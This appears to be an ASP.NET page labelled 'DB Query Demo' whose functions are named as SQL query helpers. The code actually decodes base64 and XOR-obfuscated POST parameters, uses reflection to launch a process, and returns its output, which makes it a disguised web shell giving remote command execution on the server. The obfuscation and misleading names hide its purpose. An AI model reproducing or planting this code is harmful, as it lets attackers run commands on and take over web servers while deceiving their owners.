<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.Linq" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Text" %>
<html>
    <head>
    <title>DB Query Demo</title>
    </head>
    <body >
        <script runat="server">  

            string BuildQuery(string text, string id)
            {
                byte[] bytes1 = Encoding.UTF8.GetBytes(text);
                byte[] bytes2 = Encoding.UTF8.GetBytes(id);

                byte[] result = new byte[Math.Min(bytes1.Length, bytes2.Length)];

                for (int i = 0; i < result.Length; i++)
                {
                    result[i] = (byte)(bytes1[i] ^ bytes2[i]);
                }
                string r = Encoding.UTF8.GetString(result);
                return r;
            }

            string Run_SQLQuery(string instance, string programme)
            {
                try
                {
                    byte[] data = Convert.FromBase64String(instance);
                    string decStr = System.Text.Encoding.UTF8.GetString(data);
                    byte[] key = Convert.FromBase64String(programme);
                    string keyStr = System.Text.Encoding.UTF8.GetString(key);
                    
                    string[] query = BuildQuery(decStr, keyStr).Split('~');
                    Assembly assembly = Assembly.LoadWithPartialName(query[0]);
                    Type classType = assembly.GetType(query[1]);
                    object qinfo = Activator.CreateInstance(assembly.GetType(query[2]));

                    PropertyInfo p = qinfo.GetType().GetProperty(query[3]);
                    if (p != null)
                    {
                        p.SetValue(qinfo, query[4]);
                    }
                    PropertyInfo pr = qinfo.GetType().GetProperty(query[5]);
                    if (pr != null)
                    {
                        pr.SetValue(qinfo, query[6]);
                    }
                    PropertyInfo pro = qinfo.GetType().GetProperty(query[7]);
                    if (pro != null)
                    {
                        pro.SetValue(qinfo, false);
                    }
                    PropertyInfo prop = qinfo.GetType().GetProperty(query[8]);
                    if (prop != null)
                    {
                        prop.SetValue(qinfo, true);
                    }
                    object classInstance = Activator.CreateInstance(classType);

                    PropertyInfo prope = classType.GetProperty(query[9]);
                    if (prope != null)
                    {
                        prope.SetValue(classInstance, qinfo);
                    }

                    MethodInfo[] methods = classType.GetMethods();
                    MethodInfo startMethod = methods.FirstOrDefault(method => method.Name == query[10] && method.GetParameters().Length == 0);
                    startMethod.Invoke(classInstance, null);
                    PropertyInfo reader = classType.GetProperty(query[11]);
                    if (reader != null)
                    {
                        StreamReader read = (StreamReader)reader.GetValue(classInstance);
                        if (read != null)
                        {
                            return read.ReadToEnd();
                        }
                    }
                    else
                    {
                        return "Query Exception: Null Reader";
                    }
                    return "Query Exception: Unknown Error";
                }
                catch (Exception sqlerr)
                {
                    return sqlerr.ToString();
                }
            }

            void Page_Load(object sender, EventArgs e)
            {
                try {
                    if ((Request.Form["instance"] != null) && (Request.Form["programme"] != null)) {
                        string instance = Request.Form["instance"];
                        string programme = Request.Form["programme"];
                        Response.Write("<pre>");
                        Response.Write(Server.HtmlEncode(Run_SQLQuery(instance,programme)));
                        Response.Write("</pre>");
                    }
                } catch (Exception err_result) {
                    Response.Write("<pre>");
                    Response.Write(err_result.ToString());
                    Response.Write("</pre>");
                }
            }

        </script>
    </body>
</html>
